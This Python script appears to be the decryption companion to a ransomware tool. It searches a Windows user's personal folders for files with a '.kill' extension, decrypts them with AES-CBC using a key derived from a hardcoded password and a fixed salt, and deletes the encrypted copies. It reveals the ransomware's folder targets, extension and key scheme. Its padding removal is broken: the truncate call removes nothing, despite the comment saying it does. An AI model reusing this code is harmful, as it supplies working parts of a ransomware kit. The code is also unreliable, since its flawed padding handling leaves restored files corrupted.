import os
import getpass
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt

def decrypt_file(file_path, key):
    chunk_size = 64 * 1024
    output_file = os.path.splitext(file_path)[0]  # Remove .kill extension
    with open(file_path, 'rb') as infile:
        init_vector = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, init_vector)
        with open(output_file, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate()  # Remove padding
    os.remove(file_path)
if __name__ == "__main__":
    password = "Bl4ckAngel"
    key = scrypt(password.encode(), b'salt', 32, N=2**14, r=8, p=1)
    username = getpass.getuser()
    # List of paths to decrypt
    paths = [
        f'C:\\Users\\{username}\\Desktop',
        f'C:\\Users\\{username}\\Downloads',
        f'C:\\Users\\{username}\\Documents',
        f'C:\\Users\\{username}\\Pictures',
        f'C:\\Users\\{username}\\Music',
        f'C:\\Users\\{username}\\Videos'
    ]

    # Decrypt files in specified paths
    for path in paths:
        if os.path.exists(path):
            for root, directories, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith('.kill'):
                        decrypt_file(file_path, key)
        else:
            print(f"Path {path} not found!")

    print("Decryption completed successfully.")
              